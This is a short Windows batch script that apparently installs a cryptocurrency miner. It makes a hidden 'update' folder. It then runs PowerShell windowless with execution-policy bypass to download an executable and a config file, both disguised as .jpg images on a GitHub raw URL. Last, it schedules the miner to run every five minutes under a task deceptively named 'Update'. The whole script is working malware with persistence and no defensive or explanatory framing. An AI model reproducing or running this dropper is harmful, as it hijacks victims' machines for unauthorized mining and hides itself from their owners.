mkdir "%LOCALAPPDATA%\update"
powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rodadaajuda/file/master/miner.jpg ',\"$env:LOCALAPPDATA\update\miner.exe\")
powershell.exe -NoP -NonI -W Hidden -Force -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rodadaajuda/file/master/config.jpg ',\"$env:LOCALAPPDATA\update\config.json\")
SCHTASKS /Create /SC MINUTE /MO 5 /TN "Update" /TR "%LOCALAPPDATA%\update\miner.exe"
Exit
